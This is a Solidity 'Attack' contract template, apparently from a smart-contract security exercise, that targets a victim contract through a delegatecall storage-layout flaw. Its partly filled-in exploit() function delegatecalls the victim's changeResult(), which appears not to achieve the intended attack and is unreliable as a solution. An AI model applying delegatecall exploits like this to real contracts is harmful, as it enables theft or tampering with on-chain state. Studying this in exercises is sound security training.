// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 internal dataPosition;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSignature("changeResult()");
        (bool success, ) = victim.delegatecall(data);
        require(success, "Exploit failed");
    }
}
